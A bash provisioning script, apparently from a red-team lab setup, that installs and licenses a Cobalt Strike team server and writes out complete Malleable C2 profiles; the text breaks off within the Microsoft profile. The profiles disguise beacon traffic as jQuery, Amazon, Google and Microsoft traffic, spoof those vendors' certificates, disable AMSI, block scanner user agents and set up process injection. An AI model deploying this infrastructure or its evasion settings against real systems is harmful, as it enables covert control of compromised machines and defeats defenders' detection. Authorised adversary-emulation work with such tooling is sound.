#!/bin/bash
# =============================================================================
# Cobalt Strike Installation Script (Legacy/C2-Only Mode)
# =============================================================================
# This script is used ONLY for standalone C2 infrastructure deployments
# (without GOAD lab). For GOAD deployments, use teamserver_init.sh instead.
#
# Variables passed via Terraform templatefile():
#   - cs_archive_s3_path: S3 path to Cobalt Strike archive
#   - cs_password: Team server password
#   - server_role: "c2_server" (legacy) - always treated as team server only
#   - hostname: OS hostname to set
#   - primary_domain: Primary domain for C2 (e.g., example.com)
#   - c2_subdomain: C2 subdomain prefix (e.g., api)
#   - malleable_profile: Malleable C2 profile name (default/amazon/google/microsoft/wikipedia/custom)
#   - custom_profile_content: Base64-encoded custom profile (when malleable_profile=custom)
#   - cs_license_secret_name: Secrets Manager name for CS license key
# =============================================================================

set -e

# Variables from Terraform templatefile()
CS_ARCHIVE_S3_PATH="${cs_archive_s3_path}"
CS_PASSWORD="${cs_password}"
SERVER_ROLE="${server_role}"
HOSTNAME="${hostname}"
PRIMARY_DOMAIN="${primary_domain}"
C2_SUBDOMAIN="${c2_subdomain}"
MALLEABLE_PROFILE="${malleable_profile}"
CUSTOM_PROFILE_CONTENT="${custom_profile_content}"
CS_LICENSE_SECRET_NAME="${cs_license_secret_name}"
ENABLE_REST_API="${enable_rest_api}"

# =============================================================================
# Setup Status Tracking (for Host Setup Checker dashboard feature)
# =============================================================================
SETUP_STATUS_FILE="/opt/setup-status.json"
SETUP_ROLE="c2_server"
SETUP_TOTAL=5
SETUP_STARTED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
SETUP_STEP_START=$(date +%s)
CURRENT_STEP=0
CURRENT_STEP_NAME=""

write_step_status() {
    local step_num=$1 step_name=$2 step_status=$3 message="$${4:-}"
    local now=$(date +%s)
    local duration=$((now - SETUP_STEP_START))
    SETUP_STEP_START=$now
    CURRENT_STEP=$step_num
    CURRENT_STEP_NAME=$step_name

    if [ ! -f "$SETUP_STATUS_FILE" ] || [ "$step_num" -eq 1 ]; then
        echo "{\"host\":\"$HOSTNAME\",\"role\":\"$SETUP_ROLE\",\"total_steps\":$SETUP_TOTAL,\"completed\":0,\"failed\":0,\"warnings\":0,\"status\":\"running\",\"steps\":[],\"started_at\":\"$SETUP_STARTED_AT\",\"finished_at\":null}" > "$SETUP_STATUS_FILE"
    fi

    local escaped_msg=$(echo "$message" | sed 's/"/\\"/g' | tr '\n' ' ')
    local new_step="{\"step\":$step_num,\"name\":\"$step_name\",\"status\":\"$step_status\",\"duration_s\":$duration,\"message\":\"$escaped_msg\"}"

    # Use python3 for JSON manipulation (jq may not be installed yet at step 1)
    python3 -c "
import json, sys, time
with open('$SETUP_STATUS_FILE') as f:
    data = json.load(f)
step = json.loads('$new_step')
data['steps'].append(step)
data['completed'] = sum(1 for s in data['steps'] if s['status'] in ('ok','warning'))
data['failed'] = sum(1 for s in data['steps'] if s['status'] == 'failed')
data['warnings'] = sum(1 for s in data['steps'] if s['status'] == 'warning')
if data['failed'] > 0:
    data['status'] = 'partial'
elif data['completed'] == data['total_steps']:
    data['status'] = 'complete'
data['finished_at'] = '$(date -u +%Y-%m-%dT%H:%M:%SZ)'
with open('$SETUP_STATUS_FILE', 'w') as f:
    json.dump(data, f, indent=2)
" 2>/dev/null || echo "WARNING: Failed to write setup status for step $step_num"
}

# Crash safety: mark current step as failed if script exits unexpectedly
trap 'write_step_status $CURRENT_STEP "$CURRENT_STEP_NAME" "failed" "Script exited unexpectedly"' ERR

# Logging
LOG_FILE="/var/log/cs-install.log"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "=============================================="
echo "Cobalt Strike Team Server Installation"
echo "Started: $(date)"
echo "Role: Team Server ONLY"
echo "=============================================="

# Set hostname
if [ -n "$HOSTNAME" ]; then
    hostnamectl set-hostname "$HOSTNAME"
    echo "127.0.0.1 $HOSTNAME" >> /etc/hosts
    echo "Hostname set to: $HOSTNAME"
fi

# =============================================================================
# 1. System Updates and Dependencies
# =============================================================================
echo "[1/5] Installing dependencies..."

# Wait for cloud-init to complete (5 minute timeout)
CLOUD_INIT_WAIT=0
while [ ! -f /var/lib/cloud/instance/boot-finished ]; do
    echo "Waiting for cloud-init to complete..."
    sleep 5
    CLOUD_INIT_WAIT=$((CLOUD_INIT_WAIT + 1))
    if [ $CLOUD_INIT_WAIT -ge 60 ]; then
        echo "WARNING: Cloud-init wait timed out after 5 minutes, continuing anyway"
        break
    fi
done

# Wait for network connectivity (NAT Gateway may not be ready at first boot)
echo "Checking network connectivity..."
for i in $(seq 1 30); do
    if curl -s --connect-timeout 3 http://archive.ubuntu.com > /dev/null 2>&1; then
        echo "Network ready after $i attempts"
        break
    fi
    echo "Attempt $i/30 - waiting for outbound connectivity (NAT Gateway)..."
    sleep 10
done

# Update system
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get upgrade -y

# Install required packages (minimal for team server)
apt-get install -y \
    openjdk-17-jdk \
    git \
    unzip \
    curl \
    wget \
    awscli \
    net-tools \
    htop \
    tmux \
    vim

echo "Dependencies installed successfully"
write_step_status 1 "Dependencies" "ok"

# =============================================================================
# 2. Create Directories
# =============================================================================
echo "[2/5] Creating directories..."

mkdir -p /opt/cobaltstrike/server
mkdir -p /opt/logs

# Set ownership
chown -R ubuntu:ubuntu /opt/cobaltstrike
chown -R ubuntu:ubuntu /opt/logs

echo "Directories created"
write_step_status 2 "Directories" "ok"

# =============================================================================
# 3. Download and Extract Cobalt Strike
# =============================================================================
echo "[3/5] Downloading Cobalt Strike from S3..."

CS_EXTRACTED=false
LICENSE_STATUS="unknown"

if [ -n "$CS_ARCHIVE_S3_PATH" ] && [ "$CS_ARCHIVE_S3_PATH" != "" ]; then
    # Download from S3
    aws s3 cp "$CS_ARCHIVE_S3_PATH" /tmp/cs-archive
    
    if [ $? -eq 0 ] && [ -f /tmp/cs-archive ]; then
        echo "Downloaded Cobalt Strike archive"
        
        # Detect file type and extract accordingly
        FILE_TYPE=$(file /tmp/cs-archive)
        echo "Archive type: $FILE_TYPE"
        
        if echo "$FILE_TYPE" | grep -q "gzip compressed"; then
            echo "Extracting as gzip compressed tar..."
            tar -xzf /tmp/cs-archive -C /opt/cobaltstrike --strip-components=1 && CS_EXTRACTED=true
        elif echo "$FILE_TYPE" | grep -q "POSIX tar archive"; then
            echo "Extracting as plain tar..."
            tar -xf /tmp/cs-archive -C /opt/cobaltstrike --strip-components=1 && CS_EXTRACTED=true
        elif echo "$FILE_TYPE" | grep -q "Zip archive"; then
            echo "Extracting as zip..."
            unzip -o /tmp/cs-archive -d /opt/cobaltstrike && CS_EXTRACTED=true
        else
            echo "WARNING: Unknown archive type, trying multiple methods..."
            tar -xf /tmp/cs-archive -C /opt/cobaltstrike --strip-components=1 2>/dev/null && CS_EXTRACTED=true || \
            tar -xzf /tmp/cs-archive -C /opt/cobaltstrike --strip-components=1 2>/dev/null && CS_EXTRACTED=true || \
            echo "ERROR: Failed to extract archive"
        fi
        
        # Clean up
        rm -f /tmp/cs-archive
        
        if [ "$CS_EXTRACTED" = true ]; then
            echo "Cobalt Strike extracted successfully"
            
            # Extract TeamServerImage from JAR if not present (CS 4.6+ stores it in the JAR)
            if [ -f /opt/cobaltstrike/cobaltstrike.jar ] && [ ! -f /opt/cobaltstrike/server/TeamServerImage ]; then
                echo "Extracting TeamServerImage from JAR (CS 4.6+)..."
                cd /opt/cobaltstrike/server
                unzip -o ../cobaltstrike.jar TeamServerImage -d . 2>/dev/null || true
                chmod +x TeamServerImage 2>/dev/null || true
            fi
            
            # Set permissions
            chown -R ubuntu:ubuntu /opt/cobaltstrike
            chmod +x /opt/cobaltstrike/server/teamserver 2>/dev/null || true
            chmod +x /opt/cobaltstrike/update 2>/dev/null || true
            
            # Check if license activation is needed
            # The ./update command downloads licensed binaries AND creates cobaltstrike.auth.server
            # Without running ./update, the server cannot start even if TeamServerImage exists
            if [ -f /opt/cobaltstrike/server/cobaltstrike.auth.server ]; then
                # Auth file exists — update was already run (e.g., archive includes activated files)
                LICENSE_STATUS="ready"
                echo "LICENSE: Ready (auth file present)"
            else
                # No auth file — ./update has never been run, activation required
                LICENSE_STATUS="needs_activation"
                echo "LICENSE: Needs activation (no cobaltstrike.auth.server found)"
                echo "The ./update command must be run to download licensed binaries"
            fi
        fi
    else
        echo "WARNING: Failed to download Cobalt Strike from S3"
        echo "You will need to manually install Cobalt Strike"
    fi
else
    echo "No Cobalt Strike S3 path provided"
    echo "Skipping Cobalt Strike download - manual installation required"
fi

# =============================================================================
# 3b. Automated License Activation (Optional)
# =============================================================================
# If a license key secret was provided, fetch from Secrets Manager and activate.
# Same OPSEC pattern as GitHub token: secret NAME in script, VALUE fetched at runtime.

if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "needs_activation" ] && \
   [ -n "$CS_LICENSE_SECRET_NAME" ] && [ "$CS_LICENSE_SECRET_NAME" != "" ]; then
    echo "Fetching CS license key from AWS Secrets Manager..."
    # Retry loop: IAM instance profile credentials can take 10-30s to propagate after launch.
    # The bootstrap script runs at first boot, often before IMDS credentials are available.
    CS_LICENSE_KEY=""
    for _attempt in $(seq 1 7); do
        CS_LICENSE_KEY=$(aws secretsmanager get-secret-value \
            --secret-id "$CS_LICENSE_SECRET_NAME" \
            --query 'SecretString' --output text 2>/dev/null) && break
        echo "Waiting for IAM credentials to propagate... (attempt $_attempt/7)"
        CS_LICENSE_KEY=""
        sleep 45
    done

    if [ -n "$CS_LICENSE_KEY" ]; then
        echo "License key retrieved, running automated activation..."
        cd /opt/cobaltstrike

        # Run update with license key piped to stdin
        # OPSEC: redirect output to temp file to avoid logging the license key
        echo "$CS_LICENSE_KEY" | sudo ./update > /tmp/cs-update-output.log 2>&1
        UPDATE_EXIT=$?

        # Log non-sensitive lines only (success/failure/download status)
        grep -iE "error|fail|success|complete|download|install|update|version" /tmp/cs-update-output.log >> "$LOG_FILE" 2>/dev/null || true
        rm -f /tmp/cs-update-output.log

        if [ $UPDATE_EXIT -eq 0 ]; then
            echo "License activation command completed (exit code 0)"
        else
            echo "WARNING: License activation exited with code $UPDATE_EXIT"
        fi

        # Re-check license status after activation
        if [ -f /opt/cobaltstrike/server/cobaltstrike.auth.server ]; then
            LICENSE_STATUS="ready"
            echo "LICENSE: Activated successfully via Secrets Manager"
        else
            LICENSE_STATUS="needs_activation"
            echo "WARNING: License activation may have failed — cobaltstrike.auth.server not found"
            echo "Run manually: cd /opt/cobaltstrike && sudo ./update"
        fi

        # OPSEC: Clear license key from memory immediately
        unset CS_LICENSE_KEY
        echo "CS license key cleared from memory (OPSEC)"
    else
        echo "WARNING: Failed to fetch CS license key from Secrets Manager"
        echo "HINT: Check IAM role has secretsmanager:GetSecretValue for: $CS_LICENSE_SECRET_NAME"
        echo "Manual activation still required: cd /opt/cobaltstrike && sudo ./update"
    fi
elif [ "$LICENSE_STATUS" = "needs_activation" ]; then
    echo "No CS license secret configured — manual activation required"
    echo "Run: cd /opt/cobaltstrike && sudo ./update"
fi

# =============================================================================
# 3c. Deploy Malleable C2 Profile
# =============================================================================
# The default profile is the jQuery profile from threatexpress/malleable-c2.
# This profile disguises beacon traffic as jQuery CDN requests.
# Source: https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
#
# IMPORTANT: The nginx redirector URI patterns (setup_redirector.sh) are pre-configured
# to match this profile's URIs. If you use a different profile, you MUST also update
# the nginx location blocks on each redirector to match your profile's URIs.
#
# Profile URIs (must match nginx):
#   http-get:     /jquery-3.3.1.min.js
#   http-post:    /jquery-3.3.2.min.js
#   http-stager:  /jquery-3.3.1.slim.min.js (x86)
#                 /jquery-3.3.2.slim.min.js (x64)

PROFILE_DIR="/opt/cobaltstrike/profiles"
PROFILE_PATH=""
mkdir -p "$PROFILE_DIR"

if [ "$MALLEABLE_PROFILE" = "default" ] || [ -z "$MALLEABLE_PROFILE" ]; then
    echo "Deploying default jQuery Malleable C2 profile..."
    PROFILE_PATH="$PROFILE_DIR/jquery.profile"

    # Download the jQuery profile from threatexpress (battle-tested, well-maintained)
    PROFILE_URL="https://raw.githubusercontent.com/threatexpress/malleable-c2/master/jquery-c2.4.9.profile"
    if curl -sL --connect-timeout 10 "$PROFILE_URL" -o "$PROFILE_PATH" 2>/dev/null && [ -s "$PROFILE_PATH" ]; then
        echo "jQuery profile downloaded from GitHub (threatexpress/malleable-c2)"
    else
        echo "WARNING: Failed to download profile from GitHub, creating minimal fallback..."
        # Minimal fallback profile with matching URIs
        # This is a stripped-down version — the full profile from GitHub is preferred
        cat > "$PROFILE_PATH" << 'PROFILEEOF'
# Minimal jQuery Malleable C2 Profile (fallback)
# Full version: https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
#
# URIs must match nginx redirector location blocks:
#   GET:    /jquery-3.3.1.min.js
#   POST:   /jquery-3.3.2.min.js
#   Stager: /jquery-3.3.1.slim.min.js (x86), /jquery-3.3.2.slim.min.js (x64)

set sample_name "jQuery Fallback Profile";
set sleeptime "45000";
set jitter "37";
set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";

https-certificate {
    set C   "US";
    set CN  "jquery.com";
    set O   "jQuery";
    set OU  "Certificate Authority";
    set validity "365";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {
    set uri "/jquery-3.3.1.min.js";
    set verb "GET";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            mask;
            base64url;
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "/* End jQuery */";
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.3.2.min.js";
    set verb "POST";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
        id {
            mask;
            base64url;
            parameter "__cfduid";
        }
        output {
            mask;
            base64url;
            print;
        }
    }
    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            mask;
            base64url;
            prepend "/*! jQuery v3.3.2 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "/* End jQuery */";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";
    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "/* End jQuery */";
            print;
        }
    }
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}

stage {
    set allocator      "VirtualAlloc";
    set magic_pe       "NO";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set cleanup "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
PROFILEEOF
    fi

    chown -R ubuntu:ubuntu "$PROFILE_DIR"

    # Validate profile with c2lint (only if CS is extracted and licensed)
    if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
        echo "Validating profile with c2lint..."
        cd /opt/cobaltstrike/server
        C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
        if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
            echo "WARNING: c2lint reported errors in the profile:"
            echo "$C2LINT_OUTPUT" | grep -i "error"
            echo "The team server may fail to start. Check the profile manually."
        else
            echo "c2lint validation passed"
        fi
        cd /
    else
        echo "Skipping c2lint validation (CS not yet licensed or extracted)"
        echo "Run manually after activation: cd /opt/cobaltstrike/server && ./c2lint $PROFILE_PATH"
    fi

    echo "Malleable profile deployed: $PROFILE_PATH"
elif [ "$MALLEABLE_PROFILE" = "custom" ] && [ -n "$CUSTOM_PROFILE_CONTENT" ]; then
    # Custom profile: decode base64 content from web app and deploy
    echo "Deploying custom Malleable C2 profile from web app..."
    PROFILE_PATH="$PROFILE_DIR/custom.profile"

    # Decode base64 content to profile file
    echo "$CUSTOM_PROFILE_CONTENT" | base64 -d > "$PROFILE_PATH" 2>/dev/null

    if [ -s "$PROFILE_PATH" ]; then
        echo "Custom profile decoded and written to: $PROFILE_PATH"
        chown -R ubuntu:ubuntu "$PROFILE_DIR"

        # Validate with c2lint if available
        if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
            echo "Validating custom profile with c2lint..."
            cd /opt/cobaltstrike/server
            C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
            if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
                echo "WARNING: c2lint reported errors in the custom profile:"
                echo "$C2LINT_OUTPUT" | grep -i "error"
                echo "The team server may fail to start. Check and fix the profile manually."
                echo "Profile location: $PROFILE_PATH"
            else
                echo "c2lint validation passed for custom profile"
            fi
            cd /
        else
            echo "Skipping c2lint validation (CS not yet licensed or extracted)"
            echo "Run manually after activation: cd /opt/cobaltstrike/server && ./c2lint $PROFILE_PATH"
        fi

        echo "Custom Malleable profile deployed: $PROFILE_PATH"
    else
        echo "ERROR: Failed to decode custom profile content (base64 decode failed or empty)"
        echo "The team server will start WITHOUT a Malleable profile."
        PROFILE_PATH=""
    fi
elif [ "$MALLEABLE_PROFILE" = "amazon" ]; then
    echo "Deploying Amazon CDN Malleable C2 profile..."
    PROFILE_PATH="$PROFILE_DIR/amazon.profile"
    cat > "$PROFILE_PATH" << 'PROFILEEOF'
# Amazon CDN Malleable C2 Profile
# Mimics Amazon CloudFront / AWS API traffic
# Source: BC-SECURITY/Malleable-C2-Profiles + OPSEC hardening
#
# URIs must match nginx redirector location blocks:
#   GET:    /latest/meta-data/instance-id
#   POST:   /2/content/save
#   Stager: /latest/api/plugins/versionCheck (x86)
#           /latest/api/plugins/versionCheck64 (x64)

set sample_name "Amazon CDN Profile";
set sleeptime "45000";
set jitter    "25";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

https-certificate {
    set CN       "*.cloudfront.net";
    set O        "Amazon.com Inc.";
    set validity "365";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "AmazonEC2";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {
    set uri "/latest/meta-data/instance-id";

    client {
        header "Accept" "text/html, application/json, */*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Connection" "keep-alive";

        metadata {
            base64url;
            header "X-Amz-Security-Token";
        }
    }

    server {
        header "Content-Type" "text/plain; charset=utf-8";
        header "Server" "AmazonEC2";
        header "X-Amz-Request-Id" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

        output {
            base64url;
            prepend "i-";
            append "\n";
            print;
        }
    }
}

http-post {
    set uri "/2/content/save";
    set verb "POST";

    client {
        header "Content-Type" "application/x-amz-json-1.1";
        header "X-Amz-Target" "ContentService.SaveContent";

        id {
            base64url;
            header "X-Amz-Request-Id";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/x-amz-json-1.1";
        header "Server" "AmazonEC2";

        output {
            base64url;
            prepend "{\"RequestId\":\"";
            append "\",\"Status\":\"Accepted\"}";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/latest/api/plugins/versionCheck";
    set uri_x64 "/latest/api/plugins/versionCheck64";

    client {
        header "Accept" "application/octet-stream, */*";
        header "Connection" "keep-alive";
    }

    server {
        header "Content-Type" "application/octet-stream";
        header "Server" "AmazonEC2";
    }
}

stage {
    set allocator      "VirtualAlloc";
    set magic_pe       "NO";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set cleanup "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
PROFILEEOF
    chown -R ubuntu:ubuntu "$PROFILE_DIR"

    # Validate profile with c2lint (only if CS is extracted and licensed)
    if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
        echo "Validating Amazon profile with c2lint..."
        cd /opt/cobaltstrike/server
        C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
        if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
            echo "WARNING: c2lint reported errors:"
            echo "$C2LINT_OUTPUT" | grep -i "error"
        else
            echo "c2lint validation passed"
        fi
        cd /
    fi

    echo "Amazon CDN Malleable profile deployed: $PROFILE_PATH"

elif [ "$MALLEABLE_PROFILE" = "google" ]; then
    echo "Deploying Google APIs Malleable C2 profile..."
    PROFILE_PATH="$PROFILE_DIR/google.profile"
    cat > "$PROFILE_PATH" << 'PROFILEEOF'
# Google APIs Malleable C2 Profile
# Mimics Google Safe Browsing / Drive API traffic
# Source: BC-SECURITY/Malleable-C2-Profiles + OPSEC hardening
#
# URIs must match nginx redirector location blocks:
#   GET:    /safebrowsing/v4/threatListUpdates:fetch
#   POST:   /drive/v3/files/upload
#   Stager: /safebrowsing/v4/fullHashes:find (x86)
#           /safebrowsing/v5/fullHashes:find (x64)

set sample_name "Google APIs Profile";
set sleeptime "30000";
set jitter    "15";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

https-certificate {
    set CN       "*.googleapis.com";
    set O        "Google LLC";
    set validity "365";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "GSE";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {
    set uri "/safebrowsing/v4/threatListUpdates:fetch";

    client {
        header "Accept" "application/json";
        header "Accept-Language" "en-US,en;q=0.9";
        header "X-GoogApps-Allowed-Domains" "*";

        metadata {
            base64url;
            parameter "key";
        }
    }

    server {
        header "Content-Type" "application/json; charset=UTF-8";
        header "Server" "GSE";
        header "X-Frame-Options" "SAMEORIGIN";

        output {
            base64url;
            prepend "{\"listUpdateResponses\":[{\"threatType\":\"MALWARE\",\"data\":\"";
            append "\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/drive/v3/files/upload";
    set verb "POST";

    client {
        header "Content-Type" "multipart/related; boundary=batch_boundary";
        header "X-Upload-Content-Type" "application/octet-stream";

        id {
            base64url;
            header "X-Goog-Upload-ID";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=UTF-8";
        header "Server" "UploadServer";

        output {
            base64url;
            prepend "{\"kind\":\"drive#file\",\"id\":\"";
            append "\",\"mimeType\":\"application/octet-stream\"}";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/safebrowsing/v4/fullHashes:find";
    set uri_x64 "/safebrowsing/v5/fullHashes:find";

    client {
        header "Accept" "application/json";
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "GSE";
    }
}

stage {
    set allocator      "VirtualAlloc";
    set magic_pe       "NO";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set cleanup "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
PROFILEEOF
    chown -R ubuntu:ubuntu "$PROFILE_DIR"

    # Validate profile with c2lint (only if CS is extracted and licensed)
    if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
        echo "Validating Google profile with c2lint..."
        cd /opt/cobaltstrike/server
        C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
        if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
            echo "WARNING: c2lint reported errors:"
            echo "$C2LINT_OUTPUT" | grep -i "error"
        else
            echo "c2lint validation passed"
        fi
        cd /
    fi

    echo "Google APIs Malleable profile deployed: $PROFILE_PATH"

elif [ "$MALLEABLE_PROFILE" = "microsoft" ]; then
    echo "Deploying Microsoft Azure Malleable C2 profile..."
    PROFILE_PATH="$PROFILE_DIR/microsoft.profile"
    cat > "$PROFILE_PATH" << 'PROFILEEOF'
# Microsoft Azure Malleable C2 Profile
# Mimics Azure AD / Microsoft Graph API traffic
# Source: BC-SECURITY/Malleable-C2-Profiles + OPSEC hardening
#
# URIs must match nginx redirector location blocks:
#   GET:    /common/oauth2/v2.0/token
#   POST:   /v1.0/me/drive/root/children
#   Stager: /connect/oauth2/authorize (x86)
#           /connect/oauth2/authorize64 (x64)

set sample_name "Microsoft Azure Profile";
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";

https-certificate {
    set CN       "login.microsoftonline.com";
    set O        "Microsoft Corporation";
    set validity "365";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Microsoft-IIS/10.0";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {
    set uri "/common/oauth2/v2.0/token";

    client {
        header "Accept" "application/json";
        header "client-request-id" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        header "Accept-Language" "en-US";

        metadata {
            base64url;
            parameter "code";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
        header "X-Content-Type-Options" "nosniff";
        header "Strict-Transport-Security" "max-age=31536000";

        output {
            base64url;
            prepend "{\"token_type\":\"Bearer\",\"access_token\":\"";
            append "\",\"expires_in\":3600}";
            print;
        }
    }
}

http-post {
    set uri "/v1.0/me/drive/root/children";
    set verb "POST";

    client {
        header "Content-Type" "application/json";
        header "Authorization" "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9";
        header "ConsistencyLevel" "eventual";

        id {
            base64url;
            header "x-ms-request-id";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/json; odata.metadata=minimal";
        header "Server" "Microsoft-IIS/10.0";

        output {
            base64url;
            prepend "{\"@odata.context\":\"https://graph.microsoft.com\",\"value\":\"";
            append "\"}";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/connect/oauth2/authorize";
    set uri_x64 "/connect/oauth2/authorize64";

    client {
        header "Accept" "text/html, application/json";
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
    }
}

stage {
    set allocator      "VirtualAlloc";
    set magic_pe       "NO";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
